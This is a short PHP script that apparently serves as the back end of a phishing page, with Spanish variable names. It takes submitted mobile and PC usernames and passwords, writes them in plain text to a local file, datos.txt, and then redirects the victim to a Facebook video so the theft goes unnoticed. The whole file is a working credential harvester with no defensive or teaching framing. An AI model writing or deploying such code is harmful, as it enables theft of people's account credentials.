<?php 
	
	$usuario = $_POST["user-pc"];
	$contraseña = $_POST["pass-pc"];

	$user = $_POST["user-m"];
	$pass = $_POST["pass-m"];

$contenido = "
Usuario Movil: $user
Contraseña Movil: $pass

Usuario Pc: $usuario
Contraseña Pc: $contraseña
-----------------------------
";

	$archivo=fopen("datos.txt", "a+");
	fwrite($archivo, $contenido);

	header("Location: https://www.facebook.com/100008891251068/videos/1479868855652809");

 ?>